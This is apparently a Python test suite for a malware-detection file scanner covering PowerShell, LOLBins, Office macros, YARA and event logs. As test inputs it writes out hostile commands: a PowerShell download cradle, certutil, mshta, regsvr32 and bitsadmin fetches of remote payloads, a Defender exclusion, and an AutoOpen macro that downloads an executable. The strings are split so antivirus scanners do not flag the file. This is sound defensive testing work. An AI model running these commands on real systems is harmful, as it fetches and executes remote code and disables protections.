"""
File scans: script patterns (encoded PowerShell, download cradles,
living-off-the-land binaries), Office macros, user YARA rules and Windows
event logs.

The suspicious commands are assembled at run time so this file does not
itself read as one to a scanner, ours or an antivirus.
"""

import base64
import io
import json
import os
import shutil
import sys
import tempfile
import types
import unittest
import zipfile
from unittest import mock

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

import _test_support  # noqa: E402,F401

from src import file_scan, script_rules  # noqa: E402

CRADLE = 'I' + 'EX (New-Object Net.WebClient).Download' + "String('http://203.0.113.7/a.ps1')"


def encode_ps(command):
    return base64.b64encode(command.encode('utf-16-le')).decode()


def scan(text, name='run.txt', **options):
    data = text if isinstance(text, bytes) else text.encode('utf-8')
    if options:
        return file_scan.scan_bytes(name, data, file_scan.ScanOptions(**options))
    return file_scan.scan_bytes(name, data)


def finding_kinds(result):
    return {f['kind'] for f in result['findings']}


class TestPowerShell(unittest.TestCase):

    def test_an_encoded_command_is_decoded_and_scanned(self):
        r = scan(f'start /b powershell.exe -NoP -W Hidden -Enc {encode_ps(CRADLE)}\n', 'run.bat')
        self.assertTrue({'ps_encoded', 'ps_download_cradle', 'ps_iex', 'ps_evasion'}
                        <= finding_kinds(r), finding_kinds(r))
        self.assertIn('http://203.0.113.7/a.ps1', r['indicators']['url'])
        self.assertIn('203.0.113.7', r['indicators']['ipv4'])
        self.assertEqual({f['line'] for f in r['findings']}, {1})

    def test_every_abbreviation_of_encodedcommand(self):
        blob = encode_ps('Write-Output 198.51.100.44')
        for flag in ('-e', '-ec', '-enc', '-EncodedCommand', '/enc', '-encodedc'):
            with self.subTest(flag=flag):
                r = scan(f'powershell {flag} {blob}\n')
                self.assertIn('ps_encoded', finding_kinds(r))
                self.assertIn('198.51.100.44', r['indicators']['ipv4'])

    def test_a_command_encoded_twice_is_read_through(self):
        inner = encode_ps('Write-Output 198.51.100.45')
        r = scan(f'powershell -enc {encode_ps("powershell -enc " + inner)}\n')
        self.assertIn('198.51.100.45', r['indicators']['ipv4'])

    def test_secrets_in_the_decoded_command_stay_masked(self):
        secret = 'Synth-' + 'Pw7x' * 3
        r = scan(f'powershell -enc {encode_ps("$cfg = @{ password = " + secret + " }")}\n')
        self.assertEqual([s['kind'] for s in r['secrets']], ['password'])
        self.assertNotIn(secret, json.dumps(r))

    def test_base64_that_is_not_powershell_is_left_alone(self):
        r = scan('xcopy /e SomeLongFolderNameWithoutSpaces1 dest\n')
        self.assertNotIn('ps_encoded', finding_kinds(r))


class TestLivingOffTheLand(unittest.TestCase):

    def test_known_abuse_of_windows_tools(self):
        cases = {
            'lolbin_certutil': 'certutil' + ' -urlcache -split -f http://198.51.100.9/x.exe x.exe',
            'lolbin_mshta': 'mshta' + ' http://198.51.100.9/a.hta',
            'lolbin_regsvr32': 'regsvr32 /s /n /u /i:' + 'http://198.51.100.9/f.sct scrobj.dll',
            'lolbin_rundll32': 'rundll32.exe ' + 'javascript:"\\..\\mshtml,RunHTMLApplication"',
            'lolbin_bitsadmin': 'bitsadmin /' + 'transfer job http://198.51.100.9/b.exe C:\\b.exe',
            'defender_tamper': 'Add-' + 'MpPreference -ExclusionPath C:\\Temp',
            'ps_frombase64': '$b = [Convert]::' + 'FromBase64String($s)',
        }
        for kind, line in cases.items():
            with self.subTest(kind=kind):
                self.assertIn(kind, finding_kinds(scan(line + '\n', 'job.cmd')))

    def test_ordinary_code_is_not_a_finding(self):
        r = scan('byte[] raw = Convert.FromBase64String(s);\ncertutil -hashfile x.iso SHA256\n'
                 'Get-ChildItem | Sort-Object Name\n', 'Tool.cs')
        self.assertEqual(r['findings'], [])

    def test_a_finding_never_repeats_the_command(self):
        # a command line can hold a password nothing names; the finding must not echo it
        r = scan('I' + 'EX (iwr http://198.51.100.3/p.ps1 -Headers @{k="Unnamed-Synth-991"})\n')
        self.assertTrue(r['findings'])
        self.assertNotIn('Unnamed-Synth-991', json.dumps(r['findings']))


def ovba_literal(source):
    """MS-OVBA compression using literal tokens only: valid, if no smaller."""
    out = bytearray(b'\x01')
    for start in range(0, len(source), 3600):
        chunk = source[start:start + 3600]
        data = bytearray()
        for i in range(0, len(chunk), 8):
            data.append(0)
            data += chunk[i:i + 8]
        header = 0xB000 | (len(data) + 2 - 3)
        out += header.to_bytes(2, 'little') + data
    return bytes(out)


class TestOfficeMacros(unittest.TestCase):

    def test_ovba_copy_tokens(self):
        # 'abc', then a copy token for 6 bytes from 3 back: 'abcabcabc'
        data = bytes([0x01, 0x05, 0xB0, 0x08]) + b'abc' + (0x2003).to_bytes(2, 'little')
        self.assertEqual(script_rules.ovba_decompress(data, 0, 1000), b'abcabcabc')

    def docm(self, source):
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, 'w', zipfile.ZIP_DEFLATED) as zf:
            zf.writestr('word/document.xml', '<w:t>Quarterly report</w:t>')
            zf.writestr('word/vbaProject.bin', b'\xd0\xcf\x11\xe0' + b'\x00' * 60 +
                        ovba_literal(source.encode('latin-1')) + b'\x00' * 30)
        return buf.getvalue()

    def test_an_auto_run_macro_is_found_and_its_source_scanned(self):
        source = ('Attribute VB_Name = "ThisDocument"\r\nSub AutoOpen()\r\n'
                  '  Shell "cmd /c curl -o %TEMP%\\p.exe http://198.51.100.20/p.exe"\r\nEnd Sub\r\n')
        r = file_scan.scan_bytes('invoice.docm', self.docm(source))
        self.assertIn('macro_autoexec', finding_kinds(r))
        self.assertIn('http://198.51.100.20/p.exe', r['indicators']['url'])

    def test_other_macros_are_noted(self):
        source = 'Attribute VB_Name = "Module1"\r\nFunction Total(a, b)\r\n Total = a + b\r\nEnd Function\r\n'
        r = file_scan.scan_bytes('budget.xlsm', self.docm(source))
        self.assertEqual(finding_kinds(r), {'office_macro'})


class FakeMatch:
    def __init__(self, rule, meta, offset):
        self.rule = rule
        self.meta = meta
        self.strings = [types.SimpleNamespace(instances=[types.SimpleNamespace(offset=offset)])]


class FakeRules:
    def match(self, data, timeout):
        at = data.find(b'MARKER')
        if at < 0:
            return []
        return [FakeMatch('Demo_Rule', {'severity': 'high', 'description': 'demo rule'}, at)]


class TestYara(unittest.TestCase):

    def setUp(self):
        self.dir = tempfile.mkdtemp(prefix='yara_')
        self.addCleanup(shutil.rmtree, self.dir, True)
        script_rules._yara_cache.clear()
        self.addCleanup(script_rules._yara_cache.clear)
        with open(os.path.join(self.dir, 'demo.yar'), 'w', encoding='utf-8') as f:
            f.write('rule Demo_Rule { strings: $a = "MARKER" condition: $a }\n')

    def test_user_rules_run_when_yara_is_installed(self):
        compiled = []
        fake = types.ModuleType('yara')
        fake.compile = lambda filepaths: (compiled.append(filepaths), FakeRules())[1]
        with mock.patch.dict(sys.modules, {'yara': fake}):
            r = scan('line one\nline two MARKER\n', yara_rules_dir=self.dir)
        self.assertEqual(len(compiled), 1)
        (finding,) = r['findings']
        self.assertEqual((finding['kind'], finding['severity'], finding['line'], finding['value']),
                         ('yara', 'HIGH', 2, 'Demo_Rule'))

    def test_without_yara_nothing_happens(self):
        with mock.patch.dict(sys.modules, {'yara': None}):
            self.assertIsNone(script_rules.load_yara(self.dir))
            r = scan('MARKER\n', yara_rules_dir=self.dir)
        self.assertEqual(r['findings'], [])


EVENT = ('<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System>'
         '<Provider Name="Microsoft-Windows-Security-Auditing"/><EventID>4688</EventID>'
         '<Computer>WS01.corp.local</Computer></System><EventData>'
         '<Data Name="SubjectUserName">alice</Data><Data Name="CommandLine">{cmd}</Data>'
         '</EventData></Event>')


def fake_evtx(xmls):
    records = [types.SimpleNamespace(xml=lambda x=x: x) for x in xmls]
    chunk = types.SimpleNamespace(records=lambda: iter(records))

    class FileHeader:
        def __init__(self, buf, offset):
            assert buf[:8] == b'ElfFile\x00'

        def chunks(self):
            return iter([chunk])

    package = types.ModuleType('Evtx')
    module = types.ModuleType('Evtx.Evtx')
    module.FileHeader = FileHeader
    package.Evtx = module
    return {'Evtx': package, 'Evtx.Evtx': module}


class TestEventLogs(unittest.TestCase):
    DATA = b'ElfFile\x00' + b'\x00' * 120

    def test_records_become_lines_of_fields(self):
        xmls = [EVENT.format(cmd='notepad.exe C:\\notes.txt'),
                EVENT.format(cmd='powershell -enc ' + encode_ps(CRADLE))]
        with mock.patch.dict(sys.modules, fake_evtx(xmls)):
            r = file_scan.scan_bytes('Security.evtx', self.DATA)
        lines = {f['kind']: f['line'] for f in r['findings']}
        self.assertEqual(lines['ps_encoded'], 2)
        self.assertIn('http://203.0.113.7/a.ps1', r['indicators']['url'])
        self.assertEqual(r['indicators']['domain']['ws01.corp.local']['scope'], 'internal')
        text = file_scan._flatten_event(xmls[0])
        self.assertIn('CommandLine: notepad.exe', text)
        self.assertIn('EventID: 4688', text)

    def test_without_python_evtx_the_raw_strings_are_read(self):
        data = b'ElfFile\x00' + 'cmd 198.51.100.77 done '.encode('utf-16-le') * 40
        with mock.patch.dict(sys.modules, {'Evtx': None, 'Evtx.Evtx': None}):
            r = file_scan.scan_bytes('System.evtx', data)
        self.assertIn('198.51.100.77', r['indicators']['ipv4'])
        self.assertTrue(any('python-evtx' in n for n in r['notes']))

    def test_a_damaged_log_does_not_break_the_scan(self):
        try:
            import Evtx.Evtx  # noqa: F401
        except ImportError:
            self.skipTest('python-evtx not installed')
        r = file_scan.scan_bytes('Broken.evtx', b'ElfFile\x00' + os.urandom(70000))
        self.assertIsInstance(r['indicators'], dict)


if __name__ == '__main__':
    unittest.main()
